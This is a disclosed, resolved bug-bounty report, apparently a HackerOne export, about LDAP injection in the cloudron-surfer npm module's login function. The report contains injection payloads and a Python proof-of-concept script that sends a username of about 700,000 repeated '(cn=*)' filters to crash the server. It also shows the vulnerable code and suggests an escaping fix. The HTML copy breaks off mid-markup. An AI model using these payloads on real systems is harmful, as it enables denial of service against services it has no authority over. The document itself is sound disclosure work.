{"id":906959,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85MDY5NTk=","url":"https://hackerone.com/reports/906959","title":"[cloudron-surfer] Denial of Service via LDAP Injection","state":"Closed","substate":"resolved","severity_rating":"critical","readable_substate":"Resolved","created_at":"2020-06-24T17:12:07.769Z","submitted_at":"2020-06-24T17:12:07.769Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"d3lla","url":"/d3lla","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":23949,"url":"https://hackerone.com/nodejs-ecosystem","handle":"nodejs-ecosystem","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Node.js third-party modules","twitter_handle":"","website":"https://nodejs.org/en/security/","about":"This program is used to handle vulnerabilities in the Node.js ecosystem."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-08-22T08:48:44.185Z","bug_reporter_agreed_on_going_public_at":"2020-08-22T08:48:44.147Z","team_member_agreed_on_going_public_at":"2020-08-21T20:49:19.798Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"I would like to report `Denial of service via LDAP Injection` vulnerability in `cloudron-surfer` module.\nIt allows a malicious attacker to send a malformed input that is interpreted as an LDAP filter, leading to Denial of Service.\n\n# Module\n\n**module name:** `cloudron-surfer`\n**version:** `5.9.0`\n**npm page:** `https://www.npmjs.com/package/cloudron-surfer`\n\n## Module Description\n\nSurfer is a Simple static file server. It comes with a commandline tool to upload files from your local folders and a webinterface to manage files directly on the server.\n\n## Module Stats\n\n[4] weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nThe module is vulnerable to a DoS via LDAP Injection.\nLDAP injection is a particular case of Injection vulnerabilities that occurs when user controlled input not properly sanitized is used to build LDAP filter. \nThis could lead to modification of LDAP statements performed. Depending on the application, this could lead to an authentication bypass, information disclosure or DoS.\n\nThe problem arises during the login phase. User controlled input `username` is used to build a LDAP filter without any sanitization. \nThe filter uses an `OR` operation between different attributes that are `uid`, `mail`, `username`, `sAMAccountName`.\nThe search returns all the users whose one of the attributes above has value `username`. Then it takes the first and match with the `password` provided using a `bind` operation.\n\nThe problem occurs when the `username` contains valid LDAP character filters, like for example `*` (the filter `(cn=*)` is a presence filter that will match any entry with one or more values for the `cn` attribute), that could change the LDAP statement.\n\nIf an attacker provides as `username` the value `*`, this will result in the following filter:\n`(|(uid=*)(mail=*)(username=*)(sAMAccountName=*))`.\n\nIn order for an attacker to perform a DoS, he/she has to build a filter that will take long time to be evaluated.\nFor example, if the attacker provides the following payload `*)(cn=*)(cn=*`, this will result in the following filter:\n`(|(uid=*)(cn=*)(cn=*)(mail=*)(cn=*)(cn=*)(username=*)(cn=*)(cn=*)(sAMAccountName=*)(cn=*)(cn=*))`.\n\nIf instead of `*)(cn=*)(cn=*`, an attacker repeat the middle `(cn=*)` thousand of times, this will result in a huge filter that will take a huge amount of time to be evaluated, leading to DoS.\n\nBelow the vulnerable code:\n\n```javascript\n// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74\n....\n\nfunction verifyUser(username, password, callback) {\n    if (AUTH_METHOD === 'ldap') {\n        var ldapClient = ldapjs.createClient({ url: process.env.CLOUDRON_LDAP_URL });\n        ldapClient.on('error', function (error) {\n            console.error('LDAP error', error);\n        });\n\n        ldapClient.bind(process.env.CLOUDRON_LDAP_BIND_DN, process.env.CLOUDRON_LDAP_BIND_PASSWORD, function (error) {\n            if (error) return callback(error);\n\n            var filter = `(|(uid=${username})(mail=${username})(username=${username})(sAMAccountName=${username}))`; //\u003c-- INJECTION: username is not sanitized\n            ldapClient.search(process.env.CLOUDRON_LDAP_USERS_BASE_DN, { filter: filter }, function (error, result) {\n                if (error) return callback(error);\n\n                var items = [];\n\n                result.on('searchEntry', function(entry) { items.push(entry.object); });\n                result.on('error', callback);\n                result.on('end', function (result) {\n                    if (result.status !== 0 || items.length === 0) return callback('Invalid credentials');\n\n                    // pick the first found\n                    var user = items[0];\n\n                    ldapClient.bind(user.dn, password, function (error) {\n                        if (error) return callback('Invalid credentials');\n\n                        callback(null, { username: username });\n                    });\n                });\n            });\n        });\n    }\n...\n\n// https://github.com/nebulade/surfer/blob/master/src/auth.js#L107\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L113\nexports.login = function (req, res, next) {\n    verifyUser(req.body.username, req.body.password, function (error, user) { //\u003c-- USER CONTROLLED INPUT\n        if (error) return next(new HttpError(401, 'Invalid credentials'));\n\n        var accessToken = LOGIN_TOKEN_PREFIX + uuid();\n\n        tokenStore.set(accessToken, user, function (error) {\n            if (error) return next(new HttpError(500, error));\n\n            next(new HttpSuccess(201, { accessToken: accessToken, user: user }));\n        });\n    });\n};\n\n```\n\n```javascript\n// https://github.com/nebulade/surfer/blob/master/server.js#L76\n// https://git.cloudron.io/cloudron/surfer/-/blob/master/server.js#L75\n...\nrouter.post  ('/api/login', auth.login);\n...\n```\n## Steps To Reproduce:\n\nTo test this app on a real live system, you need first to install `Cloudron` (https://cloudron.io/get.html) and then install the `Surfer` app (https://cloudron.io/store/io.cloudron.surfer.html). In order to install the `Cloudron` app you need first a domain. In this case the web interface is available under the `https://[appdomain]/_admin/` location.\n\nIstead of the above setting, I tested the app locally. \nBelow steps to reproduce the vulnerability.\n\nAs mentioned in another project (https://github.com/nebulade/meemo#development ), to simulate a LDAP server for users authentication, I used a test server provided by the same author (https://github.com/nebulade/ldapjstestserver). (you can find attached).\n\n- create a directory for testing\n    - `mkdir poc`\n    - `cd poc/`\n\n- install `cloudron-surfer` module:\n    -  `npm i cloudron-surfer`\n\n- start the LDAP test server:\n    -  `node ldapjstestserver.js`\n\n- start the `surfer` app locally (we need to setup some enviroment variables to enable the LDAP authentication):\n    - `CLOUDRON_LDAP_BIND_DN=\"cn=admin,ou=users,dc=example\" CLOUDRON_LDAP_BIND_PASSWORD=\"password\" CLOUDRON_LDAP_USERS_BASE_DN=\"ou=users,dc=example\" CLOUDRON_LDAP_URL=\"ldap://localhost:3002\" node node_modules/cloudron-surfer/server.js`\n\nBefore performing the attack let's first check that everything works as expected:\n- visit `http://localhost:3000/_admin/`\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nBefore performing the attack let's first check that everything works as expected even with a long value for `username`:\n- visit `http://localhost:3000/_admin/`\n- run the following `python` script (`run_safe.py`):\n\n```python\nimport requests\n\nurl = 'http://localhost:3000/api/login'\n\npayload =  \"a\"*(len(\"*)\") + len(\"(cn=*)\")*700000 + len(\"(cn=*\"))\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\ndata = {\n    'username': payload,\n    'password': 'pass'\n}\n\nresponse = requests.post(url, data = data)\n```\n\n- enter `normal` and `test` respectively in the `username` and `password` fields and the click enter\n- logout \n\nReproduce the attack:\n- visit `http://localhost:3000/_admin/`\n- run the following `python` script (`run.py`):\n\n```python\nimport requests\n\nurl = 'http://localhost:3000/api/login'\n\npayload = \"*)\" + \"(cn=*)\"*700000 + \"(cn=*\"\n\nprint(f\"Payload's length: {len(payload)} characters\")\n\ndata = {\n    'username': payload,\n    'password': 'pass'\n}\n\nresponse = requests.post(url, data = data)\n```\n- the page will load until the server crashes. After some time you will get the following error:\n`FATAL ERROR: Ineffective mark-compacts near heap limit Allocation failed - JavaScript heap out of memory`\n\nIf an attacker send one (like in my case) or multiple requests like in the previous example, he/she could potentially makes the service unavaible and consumes all the server resources, leading to DoS.\n\n{F881315}\n\n## Patch\nSanitize the user input before using it to build LDAP filters.\n\nPossible solution could be for example this one (taken from another project):\n- Github Issue: [Vulnerable to ldap injection](https://github.com/vesse/node-ldapauth-fork/issues/21)\n- Github Commit: [Sanitize user input: Replace the specific special characters with codes as defined in LDAP specification.](https://github.com/vesse/node-ldapauth-fork/commit/3feea43e243698bcaeffa904a7324f4d96df60e4) \n\nInspired by the same issue (https://github.com/vesse/node-ldapauth-fork/issues/21), here there are the RFC specifications (https://tools.ietf.org/search/rfc4515#section-3 ):\n```\n    The rule ensures that the entire filter string is a\n    valid UTF-8 string and provides that the octets that represent the\n    ASCII characters \"*\" (ASCII 0x2a), \"(\" (ASCII 0x28), \")\" (ASCII\n    0x29), \"\" (ASCII 0x5c), and NUL (ASCII 0x00) are represented as a\n    backslash \"\" (ASCII 0x5c) followed by the two hexadecimal digits\n    representing the value of the encoded octet.\n\n    This simple escaping mechanism eliminates filter-parsing ambiguities\n    and allows any filter that can be represented in LDAP to be\n    represented as a NUL-terminated string. Other octets that are part\n    of the set may be escaped using this mechanism, for example,\n    non-printing ASCII characters.\n\n    For AssertionValues that contain UTF-8 character data, each octet of\n    the character to be escaped is replaced by a backslash and two hex\n    digits, which form a single octet in the code of the character. For\n    example, the filter checking whether the \"cn\" attribute contained a\n    value with the character \"\" anywhere in it would be represented as\n    \"(cn=\\2a*)\".\n\n    As indicated by the rule, implementations MUST escape\n    all octets greater than 0x7F that are not part of a valid UTF-8\n    encoding sequence when they generate a string representation of a\n    search filter. Implementations SHOULD accept as input strings that\n    are not valid UTF-8 strings. This is necessary because RFC 2254 did\n    not clearly define the term \"string representation\" (and in\n    particular did not mention that the string representation of an LDAP\n    search filter is a string of UTF-8-encoded Unicode characters).\n```\n\n\n\n\n## Supporting Material/References:\n\nSome helpful resources I used for this research:\n- [LDAP injection](https://en.wikipedia.org/wiki/LDAP_injection)\n- [LDAP Filters](https://ldap.com/ldap-filters/)\n- [BlackHat: LDAP Injection \u0026 Blind LDAP Injection](https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf)\n- [Understanding and Defending Against LDAP Injection Attacks](https://ldap.com/2018/05/04/understanding-and-defending-against-ldap-injection-attacks/)\n- [LDAP Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/LDAP_Injection_Prevention_Cheat_Sheet.html)\n- [Ldapjs - orfilter](http://ldapjs.org/filters.html#orfilter)\n\nMy setup:\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4\n\n# Wrap up\n\n- I contacted the maintainer to let them know: [N] \n- I opened an issue in the related repository: [N] \n\n\nThank you for your time.\n\nbest regards,\n\nd3lla\n\n## Impact\n\nDenial of service","vulnerability_information_html":"\u003cp\u003eI would like to report \u003ccode\u003eDenial of service via LDAP Injection\u003c/code\u003e vulnerability in \u003ccode\u003ecloudron-surfer\u003c/code\u003e module.\u003cbr\u003e\nIt allows a malicious attacker to send a malformed input that is interpreted as an LDAP filter, leading to Denial of Service.\u003c/p\u003e\n\n\u003ch1 id=\"module\"\u003eModule\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003emodule name:\u003c/strong\u003e \u003ccode\u003ecloudron-surfer\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e \u003ccode\u003e5.9.0\u003c/code\u003e\u003cbr\u003e\n\u003cstrong\u003enpm page:\u003c/strong\u003e \u003ccode\u003ehttps://www.npmjs.com/package/cloudron-surfer\u003c/code\u003e\u003c/p\u003e\n\n\u003ch2 id=\"module-description\"\u003eModule Description\u003c/h2\u003e\n\n\u003cp\u003eSurfer is a Simple static file server. It comes with a commandline tool to upload files from your local folders and a webinterface to manage files directly on the server.\u003c/p\u003e\n\n\u003ch2 id=\"module-stats\"\u003eModule Stats\u003c/h2\u003e\n\n\u003cp\u003e[4] weekly downloads\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cp\u003eThe module is vulnerable to a DoS via LDAP Injection.\u003cbr\u003e\nLDAP injection is a particular case of Injection vulnerabilities that occurs when user controlled input not properly sanitized is used to build LDAP filter. \u003cbr\u003e\nThis could lead to modification of LDAP statements performed. Depending on the application, this could lead to an authentication bypass, information disclosure or DoS.\u003c/p\u003e\n\n\u003cp\u003eThe problem arises during the login phase. User controlled input \u003ccode\u003eusername\u003c/code\u003e is used to build a LDAP filter without any sanitization. \u003cbr\u003e\nThe filter uses an \u003ccode\u003eOR\u003c/code\u003e operation between different attributes that are \u003ccode\u003euid\u003c/code\u003e, \u003ccode\u003email\u003c/code\u003e, \u003ccode\u003eusername\u003c/code\u003e, \u003ccode\u003esAMAccountName\u003c/code\u003e.\u003cbr\u003e\nThe search returns all the users whose one of the attributes above has value \u003ccode\u003eusername\u003c/code\u003e. Then it takes the first and match with the \u003ccode\u003epassword\u003c/code\u003e provided using a \u003ccode\u003ebind\u003c/code\u003e operation.\u003c/p\u003e\n\n\u003cp\u003eThe problem occurs when the \u003ccode\u003eusername\u003c/code\u003e contains valid LDAP character filters, like for example \u003ccode\u003e*\u003c/code\u003e (the filter \u003ccode\u003e(cn=*)\u003c/code\u003e is a presence filter that will match any entry with one or more values for the \u003ccode\u003ecn\u003c/code\u003e attribute), that could change the LDAP statement.\u003c/p\u003e\n\n\u003cp\u003eIf an attacker provides as \u003ccode\u003eusername\u003c/code\u003e the value \u003ccode\u003e*\u003c/code\u003e, this will result in the following filter:\u003cbr\u003e\n\u003ccode\u003e(|(uid=*)(mail=*)(username=*)(sAMAccountName=*))\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eIn order for an attacker to perform a DoS, he/she has to build a filter that will take long time to be evaluated.\u003cbr\u003e\nFor example, if the attacker provides the following payload \u003ccode\u003e*)(cn=*)(cn=*\u003c/code\u003e, this will result in the following filter:\u003cbr\u003e\n\u003ccode\u003e(|(uid=*)(cn=*)(cn=*)(mail=*)(cn=*)(cn=*)(username=*)(cn=*)(cn=*)(sAMAccountName=*)(cn=*)(cn=*))\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eIf instead of \u003ccode\u003e*)(cn=*)(cn=*\u003c/code\u003e, an attacker repeat the middle \u003ccode\u003e(cn=*)\u003c/code\u003e thousand of times, this will result in a huge filter that will take a huge amount of time to be evaluated, leading to DoS.\u003c/p\u003e\n\n\u003cp\u003eBelow the vulnerable code:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e// https://github.com/nebulade/surfer/blob/master/src/auth.js#L72\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// https://git.cloudron.io/cloudron/surfer/-/blob/master/src/auth.js#L74\u003c/span\u003e\n\u003cspan class=\"p\"\u003e....\u003c/span\u003e\n\n\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"nx\"\u003everifyUser\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eAUTH_METHOD\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eldap\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eldapjs\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecreateClient\u003c/span\u003e\u003cspan class=\"p\"\u003e({\u003c/span\u003e \u003cspan class=\"na\"\u003eurl\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_URL\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n        \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003econsole\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eLDAP error\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n        \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_BIND_DN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_BIND_PASSWORD\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n            \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003efilter\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`(|(uid=\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e)(mail=\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e)(username=\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e)(sAMAccountName=\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003eusername\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e))`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e//\u0026lt;-- INJECTION: username is not sanitized\u003c/span\u003e\n            \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esearch\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eprocess\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eenv\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eCLOUDRON_LDAP_USERS_BASE_DN\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"na\"\u003efilter\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"nx\"\u003efilter\u003c/span\u003e \u003cspan class=\"p\"\u003e},\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n                \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e[];\u003c/span\u003e\n\n                \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esearchEntry\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eentry\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003epush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eentry\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eobject\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e \u003cspan class=\"p\"\u003e});\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eerror\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n                \u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eon\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eend\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eresult\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003estatus\u003c/span\u003e \u003cspan class=\"o\"\u003e!==\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003elength\u003c/span\u003e \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"nx\"\u003ecallback\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eInvalid credentials\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\n                    \u003cspan class=\"c1\"\u003e// pick the first found\u003c/span\u003e\n                    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003euser\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e];\u003c/span\u003e\n\n                    \u003cspan class=\"nx\"\u003eldapClient\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebind\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003euser\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edn\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nx\"\u003epassword\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kd\"\u003efunction\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eerror\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n                        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan 